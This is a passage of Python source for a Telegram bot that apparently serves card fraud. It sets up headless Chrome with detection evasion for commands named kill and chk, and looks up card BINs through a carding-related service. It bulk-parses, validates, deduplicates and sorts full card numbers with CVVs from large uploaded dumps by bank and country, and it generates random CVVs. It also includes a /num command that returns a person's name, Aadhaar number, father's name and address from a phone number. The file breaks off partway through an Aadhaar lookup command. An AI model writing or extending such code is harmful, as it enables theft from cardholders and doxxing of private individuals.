# ==== 1. Imports & Environment Setup ====
import os
import time
import random
import asyncio
import json
import platform
import traceback
import re
import requests
import string
import tempfile
import shutil
import gc
import zipfile
import sys
from datetime import datetime
from multiprocessing import Process
from io import BytesIO, StringIO
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
from concurrent.futures import ThreadPoolExecutor
from functools import lru_cache
import threading

import nest_asyncio
import names
import psutil

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from fake_useragent import UserAgent

# ==== 1.1 Performance & Connection Pooling ====
# Global session with connection pooling for faster HTTP requests
_http_session = None
_http_session_lock = threading.Lock()

def get_http_session():
    """Get or create a pooled HTTP session for faster requests"""
    global _http_session
    if _http_session is None:
        with _http_session_lock:
            if _http_session is None:
                _http_session = requests.Session()
                adapter = requests.adapters.HTTPAdapter(
                    pool_connections=20,
                    pool_maxsize=50,
                    max_retries=requests.adapters.Retry(
                        total=2,
                        backoff_factor=0.1,
                        status_forcelist=[500, 502, 503, 504]
                    )
                )
                _http_session.mount('http://', adapter)
                _http_session.mount('https://', adapter)
    return _http_session

# Thread pool for parallel operations
_executor = ThreadPoolExecutor(max_workers=10)

# ==== 2. Global Configs ====
CHROME_PATH = "/usr/bin/google-chrome"
CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
BOT_TOKEN = os.environ.get("BOT_TOKEN") or ""
APP_VERSION = os.environ.get("APP_VERSION") or os.environ.get("BOT_VERSION") or "dev"

# Railway Pro optimizations
MAX_CONCURRENT_BROWSERS = int(os.environ.get("MAX_BROWSERS", "5"))
BROWSER_TIMEOUT = int(os.environ.get("BROWSER_TIMEOUT", "30"))

def get_optimized_chrome_options(fast_mode=False):
    """Get optimized Chrome options for Railway/container environments"""
    ua = UserAgent()
    options = webdriver.ChromeOptions()
    options.binary_location = CHROME_PATH
    options.add_argument(f"user-agent={ua.random}")
    
    # Essential headless options
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    
    # Memory optimization for Railway containers
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-software-rasterizer")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-plugins")
    options.add_argument("--disable-images")  # Faster loading
    options.add_argument("--disable-javascript-harmony-shipping")
    options.add_argument("--disable-background-networking")
    options.add_argument("--disable-background-timer-throttling")
    options.add_argument("--disable-backgrounding-occluded-windows")
    options.add_argument("--disable-breakpad")
    options.add_argument("--disable-component-extensions-with-background-pages")
    options.add_argument("--disable-component-update")
    options.add_argument("--disable-default-apps")
    options.add_argument("--disable-hang-monitor")
    options.add_argument("--disable-ipc-flooding-protection")
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-prompt-on-repost")
    options.add_argument("--disable-renderer-backgrounding")
    options.add_argument("--disable-sync")
    options.add_argument("--disable-translate")
    options.add_argument("--metrics-recording-only")
    options.add_argument("--no-first-run")
    options.add_argument("--safebrowsing-disable-auto-update")
    options.add_argument("--password-store=basic")
    options.add_argument("--use-mock-keychain")
    
    # Window size
    options.add_argument("--window-size=1920,1080")
    
    # Anti-detection
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    
    # Fast mode optimizations
    if fast_mode:
        options.set_capability("pageLoadStrategy", "eager")
        options.add_argument("--blink-settings=imagesEnabled=false")
    
    return options

# Browser semaphore to limit concurrent browser instances
_browser_semaphore = threading.Semaphore(MAX_CONCURRENT_BROWSERS)


def _env_int(name: str, default: int) -> int:
    raw = os.environ.get(name)
    if raw is None or str(raw).strip() == "":
        return default
    try:
        return int(str(raw).strip())
    except Exception:
        print(f"⚠️ Invalid {name}={raw!r}; using default {default}")
        return default


BOT_ADMIN_ID = _env_int("BOT_ADMIN_ID", 123456789)

nest_asyncio.apply()
start_time = datetime.now()

# ==== 2.1 Memory Management for Railway ====
_last_gc_time = time.time()
_gc_interval = 300  # Run GC every 5 minutes

def periodic_cleanup():
    """Periodic memory cleanup for long-running Railway deployments"""
    global _last_gc_time
    current_time = time.time()
    if current_time - _last_gc_time > _gc_interval:
        gc.collect()
        _last_gc_time = current_time
        return True
    return False

def force_cleanup():
    """Force garbage collection after heavy operations"""
    gc.collect()
    
def safe_driver_quit(driver):
    """Safely quit driver with cleanup"""
    if driver:
        try:
            driver.quit()
        except Exception:
            pass
        finally:
            # Help garbage collector
            driver = None
            periodic_cleanup()

# ==== 2.2 Browser Command Health Tracking ====
BROWSER_CMDS = ("kill", "kd", "ko", "zz", "dd", "st", "bt", "chk")
_health_lock = threading.Lock()
_health_stats = {cmd: {"success": 0, "failure": 0, "last_status": "idle", "last_time": None} for cmd in BROWSER_CMDS}
_health_repair_threshold = 30  # Auto-repair when health drops below 30%
_health_window = 50  # Track last 50 operations for health calculation

def record_cmd_success(cmd: str):
    """Record a successful command execution"""
    if cmd not in BROWSER_CMDS:
        return
    with _health_lock:
        _health_stats[cmd]["success"] += 1
        _health_stats[cmd]["last_status"] = "success"
        _health_stats[cmd]["last_time"] = datetime.now().isoformat()
        # Check if we need to reset counters (prevent overflow)
        total = _health_stats[cmd]["success"] + _health_stats[cmd]["failure"]
        if total > 1000:
            # Scale down to keep ratios but prevent overflow
            _health_stats[cmd]["success"] = int(_health_stats[cmd]["success"] * 0.5)
            _health_stats[cmd]["failure"] = int(_health_stats[cmd]["failure"] * 0.5)

def record_cmd_failure(cmd: str):
    """Record a failed command execution"""
    if cmd not in BROWSER_CMDS:
        return
    with _health_lock:
        _health_stats[cmd]["failure"] += 1
        _health_stats[cmd]["last_status"] = "failure"
        _health_stats[cmd]["last_time"] = datetime.now().isoformat()
        # Check health and auto-repair if needed
        health = get_cmd_health(cmd)
        if health < _health_repair_threshold and health > 0:
            _trigger_auto_repair(cmd)

def get_cmd_health(cmd: str) -> int:
    """Get health percentage for a command (0-100)"""
    if cmd not in BROWSER_CMDS:
        return 100
    stats = _health_stats[cmd]
    total = stats["success"] + stats["failure"]
    if total == 0:
        return 100  # No data = assume healthy
    return int((stats["success"] / total) * 100)

def get_all_health() -> dict:
    """Get health stats for all browser commands"""
    result = {}
    for cmd in BROWSER_CMDS:
        stats = _health_stats[cmd]
        total = stats["success"] + stats["failure"]
        health = 100 if total == 0 else int((stats["success"] / total) * 100)
        result[cmd] = {
            "health": health,
            "success": stats["success"],
            "failure": stats["failure"],
            "total": total,
            "last_status": stats["last_status"],
            "last_time": stats["last_time"]
        }
    return result

def _trigger_auto_repair(cmd: str):
    """Auto-repair when health is critical"""
    global _health_stats
    # Force garbage collection
    gc.collect()
    # Clear some failure counts to allow recovery
    with _health_lock:
        # Reduce failure count to give command a chance to recover
        if _health_stats[cmd]["failure"] > 5:
            _health_stats[cmd]["failure"] = max(1, int(_health_stats[cmd]["failure"] * 0.3))
        # Log repair action
        print(f"⚕️ Auto-repair triggered for /{cmd} - cleared failure history")

def reset_cmd_health(cmd: str = None):
    """Reset health stats for a command or all commands"""
    global _health_stats
    with _health_lock:
        if cmd and cmd in BROWSER_CMDS:
            _health_stats[cmd] = {"success": 0, "failure": 0, "last_status": "reset", "last_time": datetime.now().isoformat()}
        else:
            for c in BROWSER_CMDS:
                _health_stats[c] = {"success": 0, "failure": 0, "last_status": "reset", "last_time": datetime.now().isoformat()}
    # Force cleanup
    gc.collect()

def get_health_bar(health: int) -> str:
    """Generate a visual health bar"""
    filled = health // 10
    empty = 10 - filled
    if health >= 70:
        color = "🟢"
    elif health >= 40:
        color = "🟡"
    else:
        color = "🔴"
    return f"{color} {'█' * filled}{'░' * empty} {health}%"

# ==== 3. Persistence & Auth Management (Local JSON file) ====
USER_DB_FILE = "users.json"

# Commands we gate
CMD_KEYS = ("bin", "kill", "kd", "ko", "zz", "dd", "st", "bt", "sort", "chk", "clean", "filter", "num", "adhar")

# Per-command approvals, plus a legacy/global "all" set
approved_cmds = {k: set() for k in CMD_KEYS}
approved_all = set()
banned_users = set()

# Command status (on/off)
cmd_status = {k: True for k in CMD_KEYS}  # True = on, False = off

# Back-compat: keep approved_users (used elsewhere); we'll populate it with global approvals
approved_users = set()  # legacy global (used by old code paths)

def _ensure_admin_seed():
    # Admin always approved for everything
    for k in CMD_KEYS:
        approved_cmds[k].add(BOT_ADMIN_ID)
    approved_all.add(BOT_ADMIN_ID)
    approved_users.add(BOT_ADMIN_ID)

def load_users():
    """Load user data from local file (no Supabase)."""
    _ensure_admin_seed()

    if not os.path.exists(USER_DB_FILE):
        approved_users.clear()
        approved_users.update(approved_all)
        return

    try:
        with open(USER_DB_FILE, "r", encoding="utf-8") as f:
            data = json.load(f) or {}

        per_cmd = data.get("per_cmd")
        if isinstance(per_cmd, dict):
            for k in CMD_KEYS:
                approved_cmds[k].update(per_cmd.get(k, []))

        approved_all.update(data.get("approved_all", []))
        banned_users.update(data.get("banned", []))

        # Back-compat keys from older versions
        if "approved" in data:
            approved_all.update(data.get("approved", []))

        if "cmd_status" in data and isinstance(data.get("cmd_status"), dict):
            cmd_status.update(data.get("cmd_status", {}))

        approved_users.clear()
        approved_users.update(approved_all)
        print(f"✅ Loaded {len(approved_all)} approved users, {len(banned_users)} banned users from {USER_DB_FILE}")
    except Exception as e:
        print(f"⚠️ Failed to load {USER_DB_FILE}: {e}")

def save_users():
    """Save user data to local file (no Supabase)."""
    try:
        payload = {
            "per_cmd": {k: sorted(list(v)) for k, v in approved_cmds.items()},
            "approved_all": sorted(list(approved_all)),
            "banned": sorted(list(banned_users)),
            "cmd_status": cmd_status,
        }

        # Atomic-ish write to reduce corruption risk on crash
        tmp_path = f"{USER_DB_FILE}.tmp"
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(payload, f)
        os.replace(tmp_path, USER_DB_FILE)
        print(f"✅ Saved user data to {USER_DB_FILE}")
    except Exception as e:
        print(f"⚠️ Failed to save user data: {e}")

def is_admin(uid): 
    return uid == BOT_ADMIN_ID

def is_approved(uid: int, cmd_key: str) -> bool:
    """Check per-command approval with global fallback and admin override."""
    if uid == BOT_ADMIN_ID:
        return True
    if uid in banned_users:
        return False
    if uid in approved_all:
        return True
    return uid in approved_cmds.get(cmd_key, set())

def is_cmd_enabled(cmd_key: str) -> bool:
    """Check if command is enabled."""
    return cmd_status.get(cmd_key, True)

load_users()

# ==== 4. Utility Functions ====
def format_timedelta(td):
    secs = int(td.total_seconds())
    hrs, rem = divmod(secs, 3600)
    mins, secs = divmod(rem, 60)
    return f"{hrs}h {mins}m {secs}s"

# ==== 4.1 BIN Database & Lookup Functions (local cache) ====
BIN_DB_1 = "bin_database_1.json"
BIN_DB_2 = "bin_database_2.json"
BIN_DB_3 = "bin_database_3.json"  # Local cache for API results
bin_cache = {}

def load_bin_databases():
    """Load BIN databases from local files."""
    global bin_cache
    
    if bin_cache:
        return bin_cache
    
    bin_cache = {}
    
    # Load cached API BINs first (DB3)
    if os.path.exists(BIN_DB_3):
        try:
            with open(BIN_DB_3, "r", encoding="utf-8") as f:
                data = json.load(f)

            if isinstance(data, dict):
                for key, value in data.items():
                    if key and isinstance(value, dict):
                        bin_cache[str(key)[:6].zfill(6)] = value
            elif isinstance(data, list):
                for item in data:
                    if isinstance(item, dict) and item.get("bin"):
                        bin_cache[str(item["bin"])[:6].zfill(6)] = item

            print(f"✅ Loaded cached BINs from {BIN_DB_3}")
        except Exception as e:
            print(f"❌ Error loading {BIN_DB_3}: {e}")
    
    # Load first database
    if os.path.exists(BIN_DB_1):
        try:
            with open(BIN_DB_1, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if isinstance(data, dict):
                    for key, value in data.items():
                        if isinstance(value, dict) and 'data' in value:
                            bin_data = value['data']
                            bin_cache[key] = bin_data
                        else:
                            bin_cache[key] = value
                elif isinstance(data, list):
                    for item in data:
                        if 'bin' in item:
                            bin_cache[item['bin']] = item
            print(f"✅ Loaded BINs from {BIN_DB_1}")
        except Exception as e:
            print(f"❌ Error loading {BIN_DB_1}: {e}")
    
    # Load second database
    if os.path.exists(BIN_DB_2):
        try:
            with open(BIN_DB_2, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if isinstance(data, dict):
                    for key, value in data.items():
                        if key not in bin_cache:
                            if isinstance(value, dict) and 'data' in value:
                                bin_data = value['data']
                                bin_cache[key] = bin_data
                            else:
                                bin_cache[key] = value
                elif isinstance(data, list):
                    for item in data:
                        if 'bin' in item and item['bin'] not in bin_cache:
                            bin_cache[item['bin']] = item
            print(f"✅ Loaded additional BINs from {BIN_DB_2}")
        except Exception as e:
            print(f"❌ Error loading {BIN_DB_2}: {e}")
    
    return bin_cache

def save_bin_to_local_cache(bin_data: dict) -> None:
    """Persist BIN data to local cache file (DB3)."""
    try:
        bin_num = str(bin_data.get("bin", ""))[:6].zfill(6)
        if not bin_num or not bin_num.isdigit() or len(bin_num) != 6:
            return

        payload = {
            "bin": bin_num,
            "brand": (bin_data.get("brand") or "Unknown").upper(),
            "type": (bin_data.get("type") or "Unknown").upper(),
            "country": bin_data.get("country") or "Unknown",
            "country_flag": bin_data.get("country_flag", "") or "",
            "country_code": bin_data.get("country_code", "") or "",
            "bank": bin_data.get("bank") or "Unknown",
            "level": bin_data.get("level", "") or "",
            "source": bin_data.get("source", "api") or "api",
            "updated_at": datetime.now().isoformat(),
        }

        # Keep in-memory cache up to date
        try:
            bin_cache[bin_num] = payload
        except Exception:
            pass

        existing = {}
        if os.path.exists(BIN_DB_3):
            try:
                with open(BIN_DB_3, "r", encoding="utf-8") as f:
                    existing = json.load(f) or {}
            except Exception:
                existing = {}

        if not isinstance(existing, dict):
            existing = {}

        existing[bin_num] = payload

        tmp_path = f"{BIN_DB_3}.tmp"
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(existing, f)
        os.replace(tmp_path, BIN_DB_3)
    except Exception as e:
        print(f"❌ Error saving BIN cache: {e}")

@lru_cache(maxsize=5000)
def _cached_bin_api_lookup(bin_str):
    """Cached API lookup for BINs not in local database"""
    try:
        session = get_http_session()
        res = session.get(f"https://bins.antipublic.cc/bins/{bin_str}", timeout=3)
        if res.status_code == 200:
            return res.json()
    except Exception:
        pass
    return None

def get_bin_info(bin_number):
    """Get BIN info from cache or API with country flag (optimized)"""
    try:
        # Ensure bin_number is 6 digits
        bin_str = str(bin_number)[:6].zfill(6)
        
        # Check cache first
        bin_cache = load_bin_databases()
        if bin_str in bin_cache:
            data = bin_cache[bin_str]
            
            # Get country flag from database
            country_flag = data.get("country_flag", "")
            if not country_flag and 'country' in data:
                # Try to generate flag from country code
                country_code = data.get('country', '').upper()
                if len(country_code) == 2:
                    # Convert country code to flag emoji
                    try:
                        flag_emoji = ''.join(chr(ord(c) + 127397) for c in country_code)
                        country_flag = flag_emoji
                    except:
                        country_flag = ""
            
            # Format the response similar to API
            brand = data.get("brand", data.get("scheme", "Unknown")).upper()
            type_ = data.get("type", "Unknown").upper()
            country = data.get("country_name", data.get("country", "Unknown"))
            country_code = data.get("country_code", data.get("country", ""))
            bank = data.get("bank", data.get("bank_name", "Unknown"))
            level = data.get("level", data.get("card_level", ""))
            
            # Build info string
            info_parts = [brand]
            if type_ and type_ != "UNKNOWN": 
                info_parts.append(type_)
            if country and country != "Unknown":
                info_parts.append(country)
            if level and level != "":
                info_parts.append(level)
            if bank and bank != "Unknown":
                info_parts.append(bank)
                
            return " • ".join(info_parts), {
                "bin": bin_str,
                "brand": brand,
                "type": type_,
                "country": country,
                "country_flag": country_flag,
                "country_code": country_code,
                "bank": bank,
                "level": level,
                "source": "database"
            }
        
        # If not in database, use API (with caching)
        data = _cached_bin_api_lookup(bin_str)
        if data:
            brand = data.get("brand", "Unknown").upper()
            type_ = data.get("type", "Unknown").upper()
            country = data.get("country_name", "Unknown")
            country_code = data.get("country", "")
            
            # Get country flag for API response
            country_flag = ""
            if country_code and len(country_code) == 2:
                try:
                    flag_emoji = ''.join(chr(ord(c) + 127397) for c in country_code.upper())
                    country_flag = flag_emoji
                except:
                    country_flag = ""
            
            bank = data.get("bank", "Unknown")
            level = data.get("level", "")
            
            # Cache the API result locally
            bin_cache[bin_str] = {
                "brand": brand,
                "type": type_,
                "country": country,
                "country_flag": country_flag,
                "country_code": country_code,
                "bank": bank,
                "level": level,
                "source": "api"
            }
            
            # Persist to local cache
            bin_data = {
                "bin": bin_str,
                "brand": brand,
                "type": type_,
                "country": country,
                "country_flag": country_flag,
                "country_code": country_code,
                "bank": bank,
                "level": level,
                "source": "api"
            }
            save_bin_to_local_cache(bin_data)
            
            # Build info string
            info_parts = [brand]
            if type_ and type_ != "UNKNOWN": 
                info_parts.append(type_)
            if country and country != "Unknown":
                info_parts.append(country)
            if level and level != "":
                info_parts.append(level)
            if bank and bank != "Unknown":
                info_parts.append(bank)
                
            return " • ".join(info_parts), {
                "bin": bin_str,
                "brand": brand,
                "type": type_,
                "country": country,
                "country_flag": country_flag,
                "country_code": country_code,
                "bank": bank,
                "level": level,
                "source": "api"
            }
    except Exception as e:
        print(f"BIN lookup error for {bin_number}: {e}")
    
    return "Unavailable", {
        "bin": str(bin_number)[:6],
        "brand": "Unknown",
        "type": "Unknown",
        "country": "Unknown",
        "country_flag": "",
        "country_code": "",
        "bank": "Unknown",
        "level": "",
        "source": "error"
    }

def parse_card_input(text: str):
    text = text.replace(" ", "|").replace("/", "|").replace("\\", "|").replace("\n", "").strip()
    parts = text.split("|")
    if len(parts) != 4:
        return None
    card, mm, yyyy, cvv = parts
    return card, mm.zfill(2), yyyy[-2:], cvv

def extract_card_input(raw_text):
    raw_text = raw_text.replace(" ", "|").replace("/", "|").replace("\\", "|").replace("\n", "").strip()
    matches = re.findall(r"\d{12,19}.\d{1,2}.\d{2,4}.\d{3,4}", raw_text)
    return matches[0] if matches else None

def get_random_cvv(original, used=None):
    # NOTE: don't use a mutable default here; otherwise values leak across calls.
    if used is None:
        used = set()
    while True:
        new = ''.join(random.choices('0123456789', k=3))
        if new != original and new not in used:
            used.add(new)
            return new

def random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    domains = [
        "gmail.com", "yahoo.com", "outlook.com", "mail.com", "protonmail.com",
        "icloud.com", "aol.com", "gmx.com", "zoho.com", "yandex.com",
        "hotmail.com", "live.com", "msn.com", "tutanota.com", "fastmail.com",
        "pm.me", "inbox.lv", "mail.ru", "mailfence.com", "hushmail.com",
        "posteo.net", "runbox.com", "startmail.com", "email.com", "keemail.me",
        "mailbox.org", "email.cz", "web.de", "t-online.de", "bluewin.ch",
        "seznam.cz", "laposte.net", "orange.fr", "btinternet.com", "sky.com",
        "virginmedia.com", "talktalk.net", "live.co.uk", "mail.co.uk"
    ]
    domain = random.choice(domains)
    return f"{name}@{domain}"

def random_password():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))

def extract_bt_cards(text):
    return [line.strip() for line in text.splitlines() if re.search(r'\d{12,19}.*\d{1,2}.*\d{2,4}.*\d{3,4}', line)]

# ==== 4.2 /clean Command Helper Functions (OPTIMIZED for 300MB+ files) ====

def _fast_luhn(card: str) -> bool:
    """Ultra-fast Luhn check - inline for speed"""
    try:
        total = 0
        for i, c in enumerate(reversed(card)):
            d = int(c)
            if i % 2 == 1:
                d *= 2
                if d > 9:
                    d -= 9
            total += d
        return total % 10 == 0
    except:
        return False

def _fast_expiry_check(mm: str, yy: str) -> bool:
    """Fast expiry check - returns True if NOT expired"""
    try:
        month = int(mm)
        year = 2000 + int(yy) if len(yy) == 2 else int(yy)
        now = datetime.now()
        if year > now.year:
            return True
        if year == now.year and month >= now.month:
            return True
        return False
    except:
        return False

def extract_and_clean_cards_fast(data_text: str) -> tuple:
    """
    FAST card extraction for large files (300MB+).
    Returns: (organized_dict, stats_dict)
    - No BIN lookups during parsing (lazy load later)
    - Single regex pass
    - Minimal memory allocation
    """
    start_time = time.time()
    
    if not data_text:
        return {}, {'total_raw': 0, 'valid': 0, 'junk': 0, 'duplicates': 0, 
                   'expired': 0, 'bins_found': 0, 'processing_time': 0}
    
    # Single comprehensive regex pattern
    pattern = re.compile(r'(\d{13,19})[|\s/\\:;,._-]+(\d{1,2})[|\s/\\:;,._-]+(\d{2,4})[|\s/\\:;,._-]+(\d{3,4})')
    
    seen = set()
    cards = []
    by_bin = {}
    by_month = {}
    by_year = {}
    by_year_month = {}  # {year_int: {month: [cards]}}
    
    stats = {'total_raw': 0, 'valid': 0, 'junk': 0, 'duplicates': 0, 'expired': 0}
    
    # Process in chunks for memory efficiency
    chunk_size = 1024 * 1024  # 1MB chunks
    pos = 0
    text_len = len(data_text)
    
    while pos < text_len:
        # Get chunk with overlap to avoid splitting cards
        end = min(pos + chunk_size, text_len)
        if end < text_len:
            # Extend to next newline to avoid splitting
            newline_pos = data_text.find('\n', end)
            if newline_pos != -1 and newline_pos < end + 1000:
                end = newline_pos + 1
        
        chunk = data_text[pos:end]
        pos = end
        
        for match in pattern.finditer(chunk):
            stats['total_raw'] += 1
            cc, mm, yy, cvv = match.groups()
            
            # Quick validations
            mm = mm.zfill(2)
            if not (1 <= int(mm) <= 12):
                stats['junk'] += 1
                continue
            
            yy = yy[-2:] if len(yy) == 4 else yy.zfill(2)
            
            if len(cvv) < 3:
                stats['junk'] += 1
                continue
            
            # Luhn check
            if not _fast_luhn(cc):
                stats['junk'] += 1
                continue
            
            # Expiry check
            if not _fast_expiry_check(mm, yy):
                stats['expired'] += 1
                continue
            
            # Dedup
            key = f"{cc}|{mm}|{yy}|{cvv}"
            if key in seen:
                stats['duplicates'] += 1
                continue
            seen.add(key)
            
            # Store minimal card data
            bin_num = cc[:6]
            full_year = 2000 + int(yy)
            
            card_data = {
                'card': cc,
                'mm': mm,
                'yy': yy,
                'cvv': cvv,
                'formatted': key,
                'bin': bin_num,
                'full_year': full_year
            }
            
            cards.append(card_data)
            
            # Organize by BIN
            if bin_num not in by_bin:
                by_bin[bin_num] = []
            by_bin[bin_num].append(card_data)
            
            # Organize by month
            if mm not in by_month:
                by_month[mm] = []
            by_month[mm].append(card_data)
            
            # Organize by year
            if yy not in by_year:
                by_year[yy] = []
            by_year[yy].append(card_data)
            
            # Organize by year_month
            if full_year not in by_year_month:
                by_year_month[full_year] = {}
            if mm not in by_year_month[full_year]:
                by_year_month[full_year][mm] = []
            by_year_month[full_year][mm].append(card_data)
    
    stats['valid'] = len(cards)
    stats['bins_found'] = len(by_bin)
    stats['processing_time'] = time.time() - start_time
    
    organized = {
        'all': cards,
        'by_bin': by_bin,
        'by_month': by_month,
        'by_year': by_year,
        'by_year_month': by_year_month,
        'by_brand': {},
        'by_type': {},
        'by_level': {},
        'by_country': {},
        'by_bank': {},
        'by_expiry_month': by_month,  # Alias for compatibility
        '_bin_info_loaded': False
    }
    
    # Add stats
    stats['years_found'] = len(by_year)
    stats['months_found'] = len(by_month)
    stats['types_found'] = 0
    stats['levels_found'] = 0
    stats['brands_found'] = 0
    stats['countries_found'] = 0
    stats['banks_found'] = 0
    
    return organized, stats

def _load_clean_bin_details(organized: dict, stats: dict) -> None:
    """Lazy load BIN details for /clean (brand, type, level, country, bank)"""
    if organized.get('_bin_info_loaded'):
        return
    
    # Sort BINs by count and limit for speed
    sorted_bins = sorted(organized['by_bin'].items(), key=lambda x: -len(x[1]))[:150]
    
    for bin_num, cards_list in sorted_bins:
        try:
            info_str, details = get_bin_info(bin_num)
            if not details:
                continue
            
            # Update each card with BIN info
            for card in cards_list:
                card['bin_info'] = info_str
                card['brand'] = details.get('brand', 'Unknown')
                card['type'] = details.get('type', 'Unknown')
                card['level'] = details.get('level', '')
                card['country'] = details.get('country', 'Unknown')
                card['country_flag'] = details.get('country_flag', '')
                card['bank'] = details.get('bank', 'Unknown')
            
            # Organize by brand
            brand = (details.get('brand') or '').upper()
            if brand and brand != 'UNKNOWN':
                if brand not in organized['by_brand']:
                    organized['by_brand'][brand] = []
                organized['by_brand'][brand].extend(cards_list)
            
            # Organize by type
            card_type = (details.get('type') or '').upper()
            if card_type and card_type != 'UNKNOWN':
                if card_type not in organized['by_type']:
                    organized['by_type'][card_type] = []
                organized['by_type'][card_type].extend(cards_list)
            
            # Organize by level
            level = (details.get('level') or '').upper()
            if level:
                if level not in organized['by_level']:
                    organized['by_level'][level] = []
                organized['by_level'][level].extend(cards_list)
            
            # Organize by country
            country = details.get('country') or ''
            flag = details.get('country_flag') or ''
            if country:
                country_key = f"{flag} {country}" if flag else country
                if country_key not in organized['by_country']:
                    organized['by_country'][country_key] = []
                organized['by_country'][country_key].extend(cards_list)
            
            # Organize by bank
            bank = details.get('bank') or ''
            if bank and bank != 'Unknown':
                if bank not in organized['by_bank']:
                    organized['by_bank'][bank] = []
                organized['by_bank'][bank].extend(cards_list)
        except:
            continue
    
    # Update stats
    stats['brands_found'] = len(organized['by_brand'])
    stats['types_found'] = len(organized['by_type'])
    stats['levels_found'] = len(organized['by_level'])
    stats['countries_found'] = len(organized['by_country'])
    stats['banks_found'] = len(organized['by_bank'])
    
    organized['_bin_info_loaded'] = True

# Legacy compatibility functions
def is_card_expired(mm, yy):
    """Check if card is expired (MM/YY format) - legacy wrapper"""
    return not _fast_expiry_check(mm, yy)

def luhn_check(card_number):
    """Validate card number using Luhn algorithm - legacy wrapper"""
    return _fast_luhn(str(card_number).replace(" ", "").replace("-", ""))

def extract_and_clean_cards_advanced(data_text):
    """
    OPTIMIZED card extraction - wrapper around fast function.
    Handles 300MB+ files with lazy BIN loading.
    Returns tuple: (valid_cards_dict, stats_dict)
    """
    if not data_text or not isinstance(data_text, str):
        return {}, {
            'total_raw': 0, 'valid': 0, 'junk': 0, 'duplicates': 0,
            'expired': 0, 'bins_found': 0, 'processing_time': 0
        }
    
    # Use fast extraction
    organized, stats = extract_and_clean_cards_fast(data_text)
    
    # Map new structure to legacy structure for backward compatibility
    organized['all_cards'] = organized.get('all', [])
    organized['by_expiry_year'] = {}
    for yy, cards in organized.get('by_year', {}).items():
        full_year = 2000 + int(yy) if len(yy) == 2 else int(yy)
        organized['by_expiry_year'][full_year] = cards
    
    return organized, stats

async def download_file_content(file):
    """Download and decode file content"""
    try:
        file_bytes = await file.download_as_bytearray()
        
        # Try different encodings
        encodings = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
        
        for encoding in encodings:
            try:
                return file_bytes.decode(encoding)
            except UnicodeDecodeError:
                continue
        
        # If all encodings fail, try with errors ignored
        return file_bytes.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"Error downloading file: {e}")
        return ""

def get_top_countries(by_country, limit=3):
    """Get top countries by card count"""
    country_counts = [(country, len(cards)) for country, cards in by_country.items()]
    country_counts.sort(key=lambda x: x[1], reverse=True)
    return country_counts[:limit]

# ==== 4.3 New Commands: /num and /adhar ====
async def num_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get details by phone number"""
    uid = update.effective_user.id
    if not is_approved(uid, "num"):
        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("num"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return
    
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /num <phone_number>\nExample: /num 9955053727", reply_to_message_id=update.message.message_id)
        return
    
    phone_number = context.args[0].strip()
    
    # Clean the phone number (remove +91, spaces, etc.)
    phone_number = re.sub(r'[^0-9]', '', phone_number)
    
    # If starts with country code, remove it
    if phone_number.startswith('91') and len(phone_number) == 12:
        phone_number = phone_number[2:]
    
    if len(phone_number) != 10 or not phone_number.isdigit():
        await update.message.reply_text("❌ Invalid phone number. Please provide a valid 10-digit Indian phone number.", reply_to_message_id=update.message.message_id)
        return
    
    try:
        msg = await update.message.reply_text("🔍 Fetching details...", reply_to_message_id=update.message.message_id)
        
        # Updated API endpoint with hidden URL
        api_url = "https://api.example.com/num"  # Hidden API endpoint
        params = {"number": phone_number}
        
        # Make request with timeout
        response = requests.get(api_url, params=params, timeout=30)
        
        if response.status_code == 200:
            data = response.json()
            
            # Format the response
            formatted = (
                f"📱 *Phone Number Details*\n\n"
                f"👤 *Name:* {data.get('name', 'N/A')}\n"
                f"🆔 *Aadhaar:* {data.get('aadhaar', 'N/A')}\n"
                f"👨‍👩‍👧 *Father's Name:* {data.get('father_name', 'N/A')}\n"
                f"📞 *Mobile:* {data.get('mobile', 'N/A')}\n"
                f"📧 *Email:* {data.get('email', 'N/A')}\n"
                f"🏠 *Address:* {data.get('address', 'N/A')}"
            )
            
            await msg.edit_text(formatted, parse_mode="Markdown")
        else:
            await msg.edit_text("❌ Error fetching details. Please try again later.")
    
    except requests.exceptions.Timeout:
        await update.message.reply_text("⏱️ Request timed out. Please try again.", reply_to_message_id=update.message.message_id)
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"❌ Error connecting to service: {str(e)[:100]}", reply_to_message_id=update.message.message_id)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}", reply_to_message_id=update.message.message_id)

async def adhar_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get details by Aadhaar number"""
    uid = update.effective_user.id
    if not is_approved(uid, "adhar"):
        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("adhar"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return
    
    if not context.args:
